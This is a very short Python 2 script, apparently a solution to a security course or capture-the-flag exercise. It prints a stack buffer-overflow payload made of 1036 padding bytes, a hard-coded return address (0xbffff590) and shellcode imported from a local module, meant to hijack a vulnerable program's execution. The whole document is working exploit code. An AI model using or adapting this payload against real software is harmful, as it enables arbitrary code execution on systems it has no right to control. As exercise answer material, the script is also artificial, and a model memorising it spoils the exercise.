from shellcode import shellcode 
from struct import pack 
import sys

print "A"*1036+ pack("<I",0xbffff590 )+"a"+shellcode
